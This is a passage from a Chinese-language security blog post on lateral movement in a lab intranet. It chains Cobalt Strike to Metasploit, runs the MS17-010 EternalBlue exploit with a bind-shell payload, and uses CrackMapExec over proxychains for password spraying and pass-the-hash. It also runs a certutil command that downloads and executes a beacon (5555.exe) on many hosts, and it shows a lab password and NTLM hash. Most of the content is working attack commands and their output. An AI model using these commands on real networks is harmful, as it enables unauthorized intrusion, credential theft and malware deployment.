<h4 id="其它漏洞"><a href="#其它漏洞" class="headerlink" title="其它漏洞"></a>其它漏洞</h4><p>还有好多。。</p>
<p>MS14-068，MS17-010，PrintNightmare，Exchange系列……</p>
<p>接下来实践一下msf联动cs实现永恒之蓝。就是将cs上线转到msf来利用永恒之蓝漏洞，因为exp只有msf有，cs是检测插件。</p>
<p>实战中，我们的kali肯定是没有内网网段的，那么就需要跳板机上线到msf，取得路由后，去攻击目标。</p>
<p>首先在cs中新增一个监听器：相当于反弹到kali（攻击机）的8888端口</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250402152113344.png" alt="image-20250402152113344"></p>
<p>msf相关设置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lport 8888</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>然后在cs上在想要转shell的目标上执行spawn msf命令。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160459330.png" alt="image-20250517160459330"></p>
<p>成功了。</p>
<p>接着看看路由：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p //查看当前路由表</span><br><span class="line">run post/multi/manage/autoroute //添加当前路由表</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160507222.png" alt="image-20250517160507222"></p>
<p>然后开始漏洞利用：</p>
<p>注意这里要选择正向上线，让msf去连接他，而不是他们来连接我（攻击机）。因为这个权限是cs给我们的，如果我们就在cs上进行漏洞利用，可以在cs建立转发上线的监听器，这样是可以利用反向上线的，而这里的msf是不可以的！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.3.25</span><br><span class="line">set lport 7799</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>设置完毕后，我们打它，如果成功，那么就会在目标机上开启7799端口，然后我们攻击机去连接它就行。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160515736.png" alt="image-20250517160515736"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250402172813516.png" alt="image-20250402172813516"></p>
<p>拿下了。</p>
<h2 id="CrackMapExec-密码喷射"><a href="#CrackMapExec-密码喷射" class="headerlink" title="CrackMapExec-密码喷射"></a>CrackMapExec-密码喷射</h2><p>手工去横向移动</p>
<ol>
<li>目标太多</li>
<li>密码太多</li>
<li>帐号太多</li>
<li>协议太多</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a></p>
<p>1、Linux Proxychains使用</p>
<p>代理配置：Proxychains.conf</p>
<p>代理调用：Proxychains 命令</p>
<p>2、密码喷射-域用户登录PTH：</p>
<p>主要参数：-u用户，-p密码，-H哈希值，-d指定域，-x执行命令</p>
<p>主要功能：多协议探针，字典设置，本地及域喷射，命令回显执行等</p>
<p>首先需要建立socks节点和proxychains，因为工具是在本地使用的。我们拿kali来吧，windows的cme不会用。。。</p>
<p>cs开一个socks4a节点</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250126221608480.png" alt="image-20250126221608480"></p>
<p>然后改一下&#x2F;etc&#x2F;proxychains4.conf文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160538848.png" alt="image-20250517160538848"></p>
<p>然后我们发现加上proxychains就能正常访问3网段</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250126221725883.png" alt="image-20250126221725883"></p>
<p>接下来我们看看crackmapexec的–help，使用说明</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250126221902221.png" alt="image-20250126221902221"></p>
<p>先获取一下user.txt吧</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250126224847935.png" alt="image-20250126224847935"></p>
<p>然后就可以用crackmapexec了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 192.168.3.21-32 -u user.txt -p admin!@#45</span><br><span class="line">proxychains4 crackmapexec smb 192.168.3.21-32 -u user.txt -H 518b98ad4178a53695dc997aa02d455c</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250126225519786.png" alt="image-20250126225519786"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27;</span><br><span class="line">#默认会尝试域内administrator</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160622823.png" alt="image-20250517160622823"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; --local-auth</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160637004.png" alt="image-20250517160637004"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; --local-auth -x &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250126230028935.png" alt="image-20250126230028935"></p>
<p>那么我们把执行的命令改为上线命令，那就拿捏了哦！这里我把jack-pc等都开起来了！这里的5555.exe使用cs中的转发上线，利用已攻陷的机器作为代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; --local-auth -x &quot;certutil -urlcache -split -f http://192.168.3.31/5555.exe 5555.exe &amp; 5555.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250126232353922.png" alt="image-20250126232353922"></p>
<p>成功上线了好多呢！</p>
<p>后续的思路是利用上线的机器，获取密码凭证，再进行进一步的横向移动！在不断的横向移动中不断导出密码凭证。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p &#x27;Admin12345&#x27; -x &quot;certutil -urlcache -split -f http://192.168.3.31/5555.exe 5555.exe &amp; 5555.exe&quot; </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250126232800691.png" alt="image-20250126232800691"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250126232814401.png" alt="image-20250126232814401"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 192.168.3.21-32 -u user.txt -H 518b98ad4178a53695dc997aa02d455c --local-auth --users</span><br><span class="line">#登陆成功后将其上面的用户进行展示</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160730962.png" alt="image-20250517160730962"></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Meteor_Kai</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://meteorkai.github.io/2025/05/18/%E5%86%85%E7%BD%91%E5%AF%B9%E6%8A%97-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%AF%87/">http://meteorkai.github.io/2025/05/18/%E5%86%85%E7%BD%91%E5%AF%B9%E6%8A%97-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%AF%87/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>CyberSecurity brings me great joy!</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/"># 内网攻防</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/">春秋云镜-Hospital wp</a>
            
            
            <a class="next" rel="next" href="/2025/05/17/2025%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/">2025第三届盘古石杯初赛wp</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Meteor_Kai | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>